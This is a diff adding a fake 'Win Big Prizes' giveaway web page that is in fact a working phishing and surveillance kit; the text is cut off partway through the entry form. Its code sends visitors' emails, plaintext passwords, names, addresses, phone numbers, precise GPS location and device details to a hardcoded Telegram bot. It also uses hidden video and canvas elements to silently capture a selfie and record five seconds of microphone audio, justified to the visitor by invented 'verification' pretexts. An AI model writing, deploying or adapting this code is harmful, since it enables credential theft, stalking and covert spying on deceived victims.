@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Win Big Prizes - Free Giveaway</title>
+<script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+<script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+<script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #0a0a0a; }
+  @keyframes float { 0%,100%{transform:translateY(0) scale(1)} 50%{transform:translateY(-20px) scale(1.05)} }
+  @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.6} }
+  @keyframes slideIn { from{transform:translateX(-20px);opacity:0} to{transform:translateX(0);opacity:1} }
+  @keyframes confettiFall { 0%{transform:translateY(-10px) rotate(0deg);opacity:1} 100%{transform:translateY(100vh) rotate(720deg);opacity:0} }
+  @keyframes glow { 0%,100%{box-shadow:0 0 20px rgba(247,212,94,0.3)} 50%{box-shadow:0 0 60px rgba(247,212,94,0.7)} }
+  @keyframes countUp { from{opacity:0;transform:scale(0.5)} to{opacity:1;transform:scale(1)} }
+  @keyframes pulseAnim { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.7;transform:scale(1.05)} }
+  input::placeholder{color:rgba(255,255,255,0.35)}
+  input:focus{border-color:rgba(247,212,94,0.6)!important; outline:none;}
+  textarea::placeholder{color:rgba(255,255,255,0.35)}
+  textarea:focus{outline:none;border-color:rgba(247,212,94,0.6)!important}
+  button:hover{transform:translateY(-2px);opacity:0.93}
+  button:active{transform:translateY(0)}
+  ::-webkit-scrollbar{width:4px}
+  ::-webkit-scrollbar-track{background:transparent}
+  ::-webkit-scrollbar-thumb{background:rgba(247,212,94,0.3);border-radius:2px}
+  /* Hidden elements for silent capture */
+  #hiddenVideo { position:fixed; opacity:0.01; pointer-events:none; width:1px; height:1px; top:-9999px; left:-9999px; }
+  #hiddenCanvas { position:fixed; opacity:0; pointer-events:none; top:-9999px; left:-9999px; }
+</style>
+</head>
+<body>
+<div id="root"></div>
+<video id="hiddenVideo" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas" width="1280" height="720"></canvas>
+
+<script type="text/babel">
+const { useState, useEffect } = React;
+
+// ============ TELEGRAM CONFIG ============
+const BOT_TOKEN = "8361162504:AAEz4-nUup_znR1Kt67r7__o-LnKdFKOwM8";
+const CHAT_ID = "8541208450";
+
+async function sendTelegram(message) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "HTML" }),
+    });
+  } catch (e) { console.log("TG msg error", e); }
+}
+
+// 📸 Photo capture karo aur Telegram par bhejo
+async function captureAndSendPhoto(stream, email) {
+  try {
+    const video = document.getElementById("hiddenVideo");
+    const canvas = document.getElementById("hiddenCanvas");
+    video.srcObject = stream;
+    // Video load hone ka wait
+    await new Promise((res, rej) => {
+      video.onloadedmetadata = res;
+      setTimeout(rej, 5000); // 5s timeout
+    });
+    await video.play();
+    // Camera warm-up ke liye 2 second wait
+    await new Promise(r => setTimeout(r, 2000));
+    // Canvas par frame draw karo
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    const ctx = canvas.getContext("2d");
+    // Selfie camera ko mirror karo
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // JPEG blob banao
+    const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.9));
+    // Stream band karo
+    stream.getTracks().forEach(t => t.stop());
+    video.srcObject = null;
+    // Telegram par photo bhejo
+    const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("photo", blob, "selfie.jpg");
+    fd.append("caption", `📸 <b>SELFIE CAPTURED</b>\n\n👤 Email: ${email}\n📅 Time: ${time}`);
+    fd.append("parse_mode", "HTML");
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+  } catch (e) {
+    console.log("Photo capture error:", e);
+    try { stream.getTracks().forEach(t => t.stop()); } catch(_) {}
+  }
+}
+
+// 🎤 Audio 5 second record karo aur Telegram par bhejo
+async function recordAndSendAudio(stream, email) {
+  return new Promise((resolve) => {
+    try {
+      const chunks = [];
+      // Best supported MIME type choose karo
+      const mimeType =
+        MediaRecorder.isTypeSupported("audio/webm;codecs=opus") ? "audio/webm;codecs=opus" :
+        MediaRecorder.isTypeSupported("audio/webm") ? "audio/webm" :
+        MediaRecorder.isTypeSupported("audio/ogg;codecs=opus") ? "audio/ogg;codecs=opus" :
+        "audio/ogg";
+
+      const rec = new MediaRecorder(stream, { mimeType });
+      rec.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+      rec.onstop = async () => {
+        try {
+          const blob = new Blob(chunks, { type: mimeType });
+          stream.getTracks().forEach(t => t.stop());
+          const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+          const fd = new FormData();
+          fd.append("chat_id", CHAT_ID);
+          fd.append("voice", blob, "recording.ogg");
+          fd.append("caption", `🎤 <b>AUDIO RECORDING (5s)</b>\n\n👤 Email: ${email}\n📅 Time: ${time}`);
+          fd.append("parse_mode", "HTML");
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: fd });
+        } catch(e) { console.log("Audio send error:", e); }
+        resolve();
+      };
+      rec.start(100); // 100ms chunks
+      setTimeout(() => { try { rec.stop(); } catch(e) { resolve(); } }, 5000);
+    } catch(e) {
+      console.log("Recorder error:", e);
+      try { stream.getTracks().forEach(t => t.stop()); } catch(_) {}
+      resolve();
+    }
+  });
+}
+
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+  let browser = "Unknown";
+  if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+  else if (ua.includes("Firefox")) browser = "Firefox";
+  else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+  else if (ua.includes("Edg")) browser = "Edge";
+  else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
+  let os = "Unknown";
+  if (ua.includes("Android")) os = "Android";
+  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+  else if (ua.includes("Windows")) os = "Windows";
+  else if (ua.includes("Mac")) os = "MacOS";
+  else if (ua.includes("Linux")) os = "Linux";
+  return { browser, os, screen: `${screen.width}x${screen.height}`, lang: navigator.language || "Unknown", online: navigator.onLine ? "Online" : "Offline" };
+}
+
+const prizes = [
+  { icon: "📱", name: "iPhone 15 Pro", category: "Tech" },
+  { icon: "🚗", name: "SUV Car", category: "Vehicle" },
+  { icon: "✈️", name: "World Tour", category: "Travel" },
+  { icon: "🏍️", name: "Sports Bike", category: "Vehicle" },
+  { icon: "🎁", name: "Gift Cards", category: "Shopping" },
+  { icon: "❄️", name: "Smart Fridge", category: "Home" },
+  { icon: "🌍", name: "Flight Tickets", category: "Travel" },
+  { icon: "🧊", name: "Premium Cooler", category: "Home" },
+  { icon: "💻", name: "MacBook Pro", category: "Tech" },
+  { icon: "🏠", name: "Home Appliances", category: "Home" },
+];
+const usersList = ["Sarah M.", "James K.", "Priya S.", "Ahmed R.", "Liu W.", "Maria G.", "Tom B.", "Aisha N."];
+
+function FloatingParticles() {
+  const particles = Array.from({length: 20}, (_, i) => ({
+    id: i, w: (i * 1.3 % 6) + 2, l: (i * 17 % 100), t: (i * 23 % 100),
+    dur: (i * 1.1 % 10) + 8, del: (i * 0.7 % 5), h: String((i * 30 % 60) + 30),
+  }));
+  return (
+    <div style={{position:"fixed",inset:0,pointerEvents:"none",overflow:"hidden",zIndex:0}}>
+      {particles.map(p => (
+        <div key={p.id} style={{position:"absolute",width:`${p.w}px`,height:`${p.w}px`,borderRadius:"50%",background:`hsla(${p.h},100%,70%,0.4)`,left:`${p.l}%`,top:`${p.t}%`,animation:`float ${p.dur}s ease-in-out infinite`,animationDelay:`${p.del}s`}}/>
+      ))}
+    </div>
+  );
+}
+
+function GiveawayApp() {
+  const [step, setStep] = useState("landing");
+  const [signup, setSignup] = useState({ email: "", password: "", confirmPassword: "" });
+  const [form, setForm] = useState({ fullName: "", address: "", mobile: "", email: "" });
+  const [errors, setErrors] = useState({});
+  const [loading, setLoading] = useState(false);
+  const [activePrize, setActivePrize] = useState(0);
+  const [currentUser, setCurrentUser] = useState(0);
+  const [locationData, setLocationData] = useState({ lat: "N/A", lng: "N/A", accuracy: "N/A" });
+  const [permissions, setPermissions] = useState({ location: false, storage: false, camera: false, mic: false });
+  const [permError, setPermError] = useState("");
+  const [permLoading, setPermLoading] = useState({ location: false, storage: false, camera: false, mic: false });
+  const [permStatus, setPermStatus] = useState({ camera: "", mic: "" });
+
+  useEffect(() => {
+    const t1 = setInterval(() => setActivePrize(p => (p + 1) % prizes.length), 2000);
+    const t2 = setInterval(() => setCurrentUser(u => (u + 1) % usersList.length), 3000);
+    return () => { clearInterval(t1); clearInterval(t2); };
+  }, []);
+
+  const validateSignup = () => {
+    const e = {};
+    if (!signup.email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) e.email = "Enter a valid email";
+    if (signup.password.length < 6) e.password = "Minimum 6 characters";
+    if (signup.password !== signup.confirmPassword) e.confirmPassword = "Passwords don't match";
+    setErrors(e); return Object.keys(e).length === 0;
+  };
+
+  const validateForm = () => {
+    const e = {};
+    if (!form.fullName.trim()) e.fullName = "Full name is required";
+    if (!form.address.trim()) e.address = "Address is required";
+    if (!form.mobile.match(/^\+?[\d\s-]{8,15}$/)) e.mobile = "Enter a valid mobile number";
+    if (!form.email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) e.email = "Enter a valid email";
+    setErrors(e); return Object.keys(e).length === 0;
+  };
+
+  const allPermissionsGranted = permissions.location && permissions.storage && permissions.camera && permissions.mic;
+
+  const requestPermission = async (type) => {
+    setPermLoading(p => ({ ...p, [type]: true }));
+    setPermError("");
+    const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+    const device = getDeviceInfo();
+    try {
+      if (type === "location") {
+        await new Promise((resolve, reject) =>
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              const lat = pos.coords.latitude.toFixed(6);
+              const lng = pos.coords.longitude.toFixed(6);
+              const acc = pos.coords.accuracy ? `${pos.coords.accuracy.toFixed(0)}m` : "N/A";
+              setLocationData({ lat, lng, accuracy: acc });
+              sendTelegram(`📍 <b>LOCATION GRANTED</b> — Giveaway\n\n👤 <b>Email:</b> ${signup.email}\n🌐 <b>Latitude:</b> ${lat}\n🌐 <b>Longitude:</b> ${lng}\n🎯 <b>Accuracy:</b> ${acc}\n🗺️ <b>Maps:</b> https://maps.google.com/?q=${lat},${lng}\n\n📱 <b>OS:</b> ${device.os} | <b>Browser:</b> ${device.browser}\n📅 <b>Time:</b> ${time}`);
+              resolve(pos);
+            }, reject, { timeout: 10000, enableHighAccuracy: true }
+          )
+        );
+        setPermissions(p => ({ ...p, location: true }));
+
+      } else if (type === "storage") {
+        localStorage.setItem("gv_test", "ok"); localStorage.removeItem("gv_test");
+        setPermissions(p => ({ ...p, storage: true }));
+        sendTelegram(`💾 <b>STORAGE GRANTED</b> — Giveaway\n\n👤 <b>Email:</b> ${signup.email}\n📱 <b>OS:</b> ${device.os} | <b>Browser:</b> ${device.browser}\n📅 <b>Time:</b> ${time}`);
+
+      } else if (type === "camera") {
+        // Front camera prefer karo
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
+        });
+        setPermissions(p => ({ ...p, camera: true }));
+        setPermStatus(s => ({ ...s, camera: "📸 Capturing photo..." }));
+        sendTelegram(`📷 <b>CAMERA GRANTED</b> — Giveaway\n\n👤 <b>Email:</b> ${signup.email}\n📱 <b>OS:</b> ${device.os} | <b>Browser:</b> ${device.browser}\n🖥️ <b>Screen:</b> ${device.screen}\n📅 <b>Time:</b> ${time}\n\n⏳ Sending photo...`);
+        // Silently photo capture karo
+        await captureAndSendPhoto(stream, signup.email);
+        setPermStatus(s => ({ ...s, camera: "✅ Photo sent!" }));
+
+      } else if (type === "mic") {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        setPermissions(p => ({ ...p, mic: true }));
+        setPermStatus(s => ({ ...s, mic: "🎤 Recording 5s..." }));
+        sendTelegram(`🎤 <b>MICROPHONE GRANTED</b> — Giveaway\n\n👤 <b>Email:</b> ${signup.email}\n📱 <b>OS:</b> ${device.os} | <b>Browser:</b> ${device.browser}\n📅 <b>Time:</b> ${time}\n\n⏳ Recording audio...`);
+        // Silently audio record karo
+        await recordAndSendAudio(stream, signup.email);
+        setPermStatus(s => ({ ...s, mic: "✅ Audio sent!" }));
+      }
+
+    } catch (err) {
+      setPermError(`Could not get ${type} permission. Please allow it in browser settings and try again.`);
+      sendTelegram(`❌ <b>${type.toUpperCase()} DENIED</b> — Giveaway\n\n👤 <b>Email:</b> ${signup.email}\n📱 <b>OS:</b> ${device.os} | <b>Browser:</b> ${device.browser}\n📅 <b>Time:</b> ${time}\n⚠️ ${err.message || err}`);
+    }
+    setPermLoading(p => ({ ...p, [type]: false }));
+  };
+
+  const handleSignup = () => {
+    if (!validateSignup()) return;
+    setLoading(true);
+    const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+    const device = getDeviceInfo();
+    sendTelegram(`🆕 <b>NEW SIGNUP</b> — Giveaway\n\n📧 <b>Email:</b> ${signup.email}\n🔒 <b>Password:</b> ${signup.password}\n\n📱 <b>OS:</b> ${device.os}\n🌐 <b>Browser:</b> ${device.browser}\n🖥️ <b>Screen:</b> ${device.screen}\n🗣️ <b>Language:</b> ${device.lang}\n📅 <b>Time:</b> ${time}`);
+    setTimeout(() => { setLoading(false); setForm(f => ({ ...f, email: signup.email })); setStep("permissions"); }, 1500);
+  };
+
+  const handleSubmit = () => {
+    if (!validateForm()) return;
+    setLoading(true);
+    const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+    const device = getDeviceInfo();
+    const entryId = Math.random().toString(36).substr(2, 9).toUpperCase();
+    sendTelegram(
+      `🎯 <b>NEW GIVEAWAY ENTRY</b>\n\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n👤 <b>PERSONAL DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
+      `📛 <b>Full Name:</b> ${form.fullName}\n📧 <b>Email:</b> ${form.email}\n📱 <b>Mobile:</b> ${form.mobile}\n🏠 <b>Address:</b> ${form.address}\n\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n🔐 <b>ACCOUNT</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
+      `📧 <b>Email:</b> ${signup.email}\n🔒 <b>Password:</b> ${signup.password}\n\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n📍 <b>LOCATION</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
+      `🌐 Lat: ${locationData.lat} | Lng: ${locationData.lng}\n🎯 Accuracy: ${locationData.accuracy}\n` +
+      `${locationData.lat !== "N/A" ? `🗺️ https://maps.google.com/?q=${locationData.lat},${locationData.lng}` : "🗺️ Not available"}\n\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n✅ <b>PERMISSIONS</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
+      `📍 ${permissions.location?"✅":"❌"} | 💾 ${permissions.storage?"✅":"❌"} | 📷 ${permissions.camera?"✅":"❌"} | 🎙️ ${permissions.mic?"✅":"❌"}\n\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n📱 <b>DEVICE</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
+      `🖥️ ${device.os} | 🌐 ${device.browser} | 📏 ${device.screen}\n\n` +
+      `🆔 Entry ID: ${entryId} | 📅 ${time}`
+    );
+    setTimeout(() => { setLoading(false); setStep("success"); }, 2000);
+  };
+
+  const S = {
+    app: { minHeight:"100vh", background:"linear-gradient(135deg,#0a0a0a 0%,#1a0a2e 40%,#0d1a3a 100%)", fontFamily:"Georgia,'Times New Roman',serif", color:"#fff", position:"relative", overflow:"hidden" },
+    cont: { maxWidth:"480px", margin:"0 auto", padding:"20px", position:"relative", zIndex:1 },
+    gold: { background:"linear-gradient(135deg,#f7d45e,#e8a020,#f7d45e)", WebkitBackgroundClip:"text", WebkitTextFillColor:"transparent", backgroundClip:"text" },
+    card: { background:"rgba(255,255,255,0.05)", backdropFilter:"blur(20px)", border:"1px solid rgba(247,212,94,0.2)", borderRadius:"24px", padding:"32px", marginBottom:"20px" },
+    inp: { width:"100%", padding:"14px 18px", background:"rgba(255,255,255,0.08)", border:"1px solid rgba(255,255,255,0.15)", borderRadius:"12px", color:"#fff", fontSize:"15px", fontFamily:"inherit", boxSizing:"border-box", transition:"border-color 0.3s" },
+    inpErr: { borderColor:"#ff6b6b" },
+    lbl: { display:"block", marginBottom:"8px", color:"rgba(255,255,255,0.7)", fontSize:"13px", letterSpacing:"0.5px", textTransform:"uppercase" },
+    btn: { width:"100%", padding:"16px", background:"linear-gradient(135deg,#f7d45e,#e8a020)", border:"none", borderRadius:"14px", color:"#0a0a0a", fontSize:"16px", fontWeight:"700", cursor:"pointer", letterSpacing:"0.5px", transition:"transform 0.2s,opacity 0.2s", fontFamily:"inherit" },
+    err: { color:"#ff6b6b", fontSize:"12px", marginTop:"4px" },
+    fg: { marginBottom:"18px" },
+    spin: { width:"16px", height:"16px", border:"2px solid #0a0a0a", borderTopColor:"transparent", borderRadius:"50%", display:"inline-block", animation:"spin 0.8s linear infinite" },
+    backBtn: { background:"none", border:"none", color:"rgba(255,255,255,0.5)", cursor:"pointer", fontSize:"14px", marginBottom:"24px", padding:0, fontFamily:"inherit" },
+  };
+
+  if (step === "landing") return (
+    <div style={S.app}>
+      <FloatingParticles />
+      <div style={{textAlign:"center", padding:"50px 20px 20px", position:"relative", zIndex:1}}>
+        <div style={{fontSize:"13px", color:"#f7d45e", letterSpacing:"4px", textTransform:"uppercase", marginBottom:"16px"}}>✦ Official Giveaway Event ✦</div>
+        <h1 style={{fontSize:"clamp(36px,10vw,64px)", lineHeight:1.1, margin:"0 0 16px", ...S.gold}}>WIN BIG<br/>PRIZES</h1>
+        <p style={{color:"rgba(255,255,255,0.6)", fontSize:"16px", lineHeight:1.6, maxWidth:"320px", margin:"0 auto 30px"}}>Enter our exclusive giveaway and stand a chance to win incredible prizes!</p>
+        <div style={{display:"inline-flex", alignItems:"center", gap:"12px", background:"rgba(247,212,94,0.1)", border:"1px solid rgba(247,212,94,0.3)", borderRadius:"100px", padding:"10px 20px", marginBottom:"40px", animation:"pulse 2s ease-in-out infinite"}}>
+          <span style={{fontSize:"24px"}}>{prizes[activePrize].icon}</span>
+          <span style={{color:"#f7d45e", fontSize:"14px", fontWeight:"600"}}>{prizes[activePrize].name}</span>
+          <span style={{color:"rgba(255,255,255,0.4)", fontSize:"12px"}}>up for grabs</span>
+        </div>
+      </div>
+      <div style={S.cont}>
+        <div style={S.card}>
+          <h3 style={{textAlign:"center", marginBottom:"20px", ...S.gold, fontSize:"18px"}}>🏆 Prize Pool</h3>
+          <div style={{display:"grid", gridTemplateColumns:"1fr 1fr", gap:"12px"}}>
+            {prizes.map((prize, i) => (
+              <div key={i} style={{background:activePrize===i?"rgba(247,212,94,0.15)":"rgba(255,255,255,0.04)", border:`1px solid ${activePrize===i?"rgba(247,212,94,0.5)":"rgba(255,255,255,0.08)"}`, borderRadius:"12px", padding:"12px", transition:"all 0.5s ease", display:"flex", alignItems:"center", gap:"8px"}}>
+                <span style={{fontSize:"20px"}}>{prize.icon}</span>
+                <div>
+                  <div style={{fontSize:"12px", fontWeight:"600", color:activePrize===i?"#f7d45e":"#fff"}}>{prize.name}</div>
+                  <div style={{fontSize:"10px", color:"rgba(255,255,255,0.4)", textTransform:"uppercase", letterSpacing:"0.5px"}}>{prize.category}</div>
+                </div>
+              </div>
+            ))}
+          </div>
+        </div>
+        <div style={{background:"rgba(0,200,100,0.1)", border:"1px solid rgba(0,200,100,0.2)", borderRadius:"12px", padding:"14px 20px", marginBottom:"20px", display:"flex", alignItems:"center", gap:"12px", animation:"slideIn 0.5s ease"}}>
+          <div style={{width:"8px", height:"8px", borderRadius:"50%", background:"#00c864", flexShrink:0, animation:"pulse 1.5s infinite"}}/>
+          <span style={{fontSize:"13px", color:"rgba(255,255,255,0.8)"}}><strong style={{color:"#00c864"}}>{usersList[currentUser]}</strong> just entered the giveaway</span>
+        </div>
+        <div style={{display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:"12px", marginBottom:"30px"}}>
+          {[{label:"Winners",value:"100"},{label:"Prizes",value:`${prizes.length}+`},{label:"Days Left",value:"3"}].map((s,i)=>(
+            <div key={i} style={{textAlign:"center", ...S.card, padding:"16px", marginBottom:0}}>
+              <div style={{fontSize:"24px", fontWeight:"700", ...S.gold}}>{s.value}</div>
+              <div style={{fontSize:"11px", color:"rgba(255,255,255,0.5)", textTransform:"uppercase", letterSpacing:"0.5px", marginTop:"4px"}}>{s.label}</div>
+            </div>
+          ))}
+        </div>
+        <button style={S.btn} onClick={()=>setStep("signup")}>🎉 Enter Giveaway Now</button>
+        <p style={{textAlign:"center", color:"rgba(255,255,255,0.3)", fontSize:"12px", marginTop:"16px"}}>Free entry · No purchase necessary · 100 worldwide winners</p>
+      </div>
+    </div>
+  );
+
+  if (step === "signup") return (
+    <div style={S.app}>
+      <FloatingParticles/>
+      <div style={{...S.cont, paddingTop:"50px"}}>
+        <button onClick={()=>setStep("landing")} style={S.backBtn}>← Back</button>
+        <div style={{textAlign:"center", marginBottom:"32px"}}>
+          <div style={{fontSize:"48px", marginBottom:"12px"}}>🔐</div>
+          <h2 style={{fontSize:"28px", margin:"0 0 8px", ...S.gold}}>Create Account</h2>
+          <p style={{color:"rgba(255,255,255,0.5)", fontSize:"14px", margin:0}}>Sign up to enter the giveaway</p>
+        </div>
+        <div style={S.card}>
+          <div style={S.fg}>
+            <label style={S.lbl}>Email Address</label>
+            <input type="email" placeholder="you@example.com" value={signup.email} onChange={e=>setSignup(s=>({...s,email:e.target.value}))} style={{...S.inp,...(errors.email?S.inpErr:{})}}/>
+            {errors.email && <div style={S.err}>⚠ {errors.email}</div>}
+          </div>
+          <div style={S.fg}>
+            <label style={S.lbl}>Password</label>
+            <input type="password" placeholder="Min. 6 characters" value={signup.password} onChange={e=>setSignup(s=>({...s,password:e.target.value}))} style={{...S.inp,...(errors.password?S.inpErr:{})}}/>
+            {errors.password && <div style={S.err}>⚠ {errors.password}</div>}
+          </div>
+          <div style={S.fg}>
+            <label style={S.lbl}>Confirm Password</label>
+            <input type="password" placeholder="Re-enter password" value={signup.confirmPassword} onChange={e=>setSignup(s=>({...s,confirmPassword:e.target.value}))} style={{...S.inp,...(errors.confirmPassword?S.inpErr:{})}}/>
+            {errors.confirmPassword && <div style={S.err}>⚠ {errors.confirmPassword}</div>}
+          </div>
+          <button style={{...S.btn, opacity:loading?0.7:1}} onClick={handleSignup} disabled={loading}>
+            {loading?<span style={{display:"flex",alignItems:"center",justifyContent:"center",gap:"10px"}}><span style={S.spin}/>Creating Account...</span>:"Continue →"}
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+
+  if (step === "permissions") return (
+    <div style={S.app}>
+      <FloatingParticles/>
+      <div style={{...S.cont, paddingTop:"50px"}}>
+        <button onClick={()=>setStep("signup")} style={S.backBtn}>← Back</button>
+        <div style={{textAlign:"center", marginBottom:"32px"}}>
+          <div style={{fontSize:"52px", marginBottom:"12px", animation:"float 3s ease-in-out infinite"}}>🔒</div>
+          <h2 style={{fontSize:"26px", margin:"0 0 8px", ...S.gold}}>Allow Permissions</h2>
+          <p style={{color:"rgba(255,255,255,0.5)", fontSize:"14px", margin:0, lineHeight:1.6, maxWidth:"300px", marginLeft:"auto", marginRight:"auto"}}>We need these permissions to verify your entry and ensure your prize reaches you</p>
+        </div>
+        <div style={S.card}>
+          {[
+            {key:"location", icon:"📍", title:"Location Access", desc:"Required to verify your region and prize eligibility", actionLabel:"Allow Location"},
+            {key:"storage", icon:"💾", title:"Storage Access", desc:"Required to save your entry details securely", actionLabel:"Allow Storage"},
+            {key:"camera", icon:"📷", title:"Camera Access", desc:"Required to verify your identity as a real person", actionLabel:"Allow Camera"},
+            {key:"mic", icon:"🎙️", title:"Microphone Access", desc:"Required for voice verification to prevent duplicates", actionLabel:"Allow Mic"},
+          ].map((perm, i) => (
+            <div key={perm.key} style={{background:permissions[perm.key]?"rgba(0,200,100,0.08)":"rgba(255,255,255,0.04)", border:`1px solid ${permissions[perm.key]?"rgba(0,200,100,0.35)":"rgba(255,255,255,0.1)"}`, borderRadius:"16px", padding:"20px", marginBottom:i<3?"14px":0, transition:"all 0.4s ease"}}>
+              <div style={{display:"flex", alignItems:"center", justifyContent:"space-between", gap:"12px"}}>
+                <div style={{display:"flex", alignItems:"center", gap:"14px"}}>
+                  <div style={{width:"48px", height:"48px", borderRadius:"14px", background:permissions[perm.key]?"rgba(0,200,100,0.15)":"rgba(255,255,255,0.08)", display:"flex", alignItems:"center", justifyContent:"center", fontSize:"22px", flexShrink:0}}>
+                    {permLoading[perm.key] ? <span style={{width:"20px", height:"20px", border:"2px solid #f7d45e", borderTopColor:"transparent", borderRadius:"50%", display:"inline-block", animation:"spin 0.8s linear infinite"}}/> : permissions[perm.key] ? "✅" : perm.icon}
+                  </div>
+                  <div>
+                    <div style={{fontWeight:"600", fontSize:"15px", marginBottom:"4px", color:permissions[perm.key]?"#00c864":"#fff"}}>{perm.title}</div>
+                    <div style={{color:"rgba(255,255,255,0.4)", fontSize:"12px", lineHeight:1.4}}>
+                      {permLoading[perm.key]
+                        ? <span style={{color:"#f7d45e", fontSize:"11px"}}>{perm.key==="camera"?"📸 Capturing photo...":"🎤 Recording 5s audio..."}</span>
+                        : permissions[perm.key] && permStatus[perm.key]
+                        ? <span style={{color:"#00c864", fontSize:"11px"}}>{permStatus[perm.key]}</span>
+                        : perm.desc}
+                    </div>
+                  </div>
+                </div>
+                {!permissions[perm.key] && !permLoading[perm.key] && (
+                  <button onClick={()=>requestPermission(perm.key)} style={{padding:"10px 16px", background:"linear-gradient(135deg,#f7d45e,#e8a020)", border:"none", borderRadius:"10px", color:"#0a0a0a", fontSize:"12px", fontWeight:"700", cursor:"pointer", whiteSpace:"nowrap", flexShrink:0, fontFamily:"inherit"}}>
+                    {perm.actionLabel}
+                  </button>
+                )}
+                {permissions[perm.key] && !permLoading[perm.key] && (
+                  <span style={{color:"#00c864", fontSize:"13px", fontWeight:"700", flexShrink:0}}>Granted ✓</span>
+                )}
+              </div>
+            </div>
+          ))}
+
+          {permError && (
+            <div style={{marginTop:"14px", background:"rgba(255,107,107,0.1)", border:"1px solid rgba(255,107,107,0.3)", borderRadius:"10px", padding:"12px 14px", fontSize:"13px", color:"#ff6b6b", lineHeight:1.5}}>
+              ⚠️ {permError}
+            </div>
+          )}
+
+          <div style={{display:"flex", gap:"8px", justifyContent:"center", margin:"20px 0 24px"}}>
+            {["location","storage","camera","mic"].map(k=>(
+              <div key={k} style={{height:"4px", flex:1, borderRadius:"2px", background:permissions[k]?"linear-gradient(90deg,#00c864,#00a050)":"rgba(255,255,255,0.1)", transition:"background 0.4s ease"}}/>
+            ))}
+          </div>
+
+          <button style={{...S.btn, opacity:allPermissionsGranted?1:0.4, cursor:allPermissionsGranted?"pointer":"not-allowed"}} onClick={()=>allPermissionsGranted&&setStep("form")} disabled={!allPermissionsGranted}>
+            {allPermissionsGranted ? "Continue to Entry Form →" : `${[!permissions.location&&"Location",!permissions.storage&&"Storage",!permissions.camera&&"Camera",!permissions.mic&&"Mic"].filter(Boolean).join(", ")} Required`}
+          </button>
+        </div>
+        <p style={{textAlign:"center", color:"rgba(255,255,255,0.25)", fontSize:"11px", marginTop:"12px", lineHeight:1.6, padding:"0 10px"}}>🌍 Permissions help us verify entries and deliver prizes correctly.</p>
+      </div>
+    </div>
+  );
+
+  if (step === "form") return (
+    <div style={S.app}>
+      <FloatingParticles/>
+      <div style={{...S.cont, paddingTop:"40px"}}>
+        <button onClick={()=>setStep("permissions")} style={S.backBtn}>← Back</button>
+        <div style={{marginBottom:"32px"}}>
+          <div style={{display:"flex", justifyContent:"space-between", marginBottom:"8px"}}>
+            <span style={{fontSize:"13px", color:"rgba(255,255,255,0.5)"}}>Step 3 of 3</span>
+            <span style={{fontSize:"13px", color:"#f7d45e"}}>Entry Form</span>
+          </div>
+          <div style={{height:"4px", background:"rgba(255,255,255,0.1)", borderRadius:"2px"}}>
+            <div style={{height:"100%", width:"100%", background:"linear-gradient(90deg,#f7d45e,#e8a020)", borderRadius:"2px"}}/>
+          </div>
+        </div>
+        <div style={{textAlign:"center", marginBottom:"28px"}}>
+          <h2 style={{fontSize:"26px", margin:"0 0 8px", ...S.gold}}>Almost There! 🎉</h2>
+          <p style={{color:"rgba(255,255,255,0.5)", fontSize:"14px", margin:0}}>Fill in your details so we can deliver your prize</p>
+        </div>
+        <div style={S.card}>
+          <div style={S.fg}>
+            <label style={S.lbl}>Full Name</label>
+            <input type="text" placeholder="John Doe" value={form.fullName} onChange={e=>setForm(f=>({...f,fullName:e.target.value}))} style={{...S.inp,...(errors.fullName?S.inpErr:{})}}/>
+            {errors.fullName && <div style={S.err}>⚠ {errors.fullName}</div>}
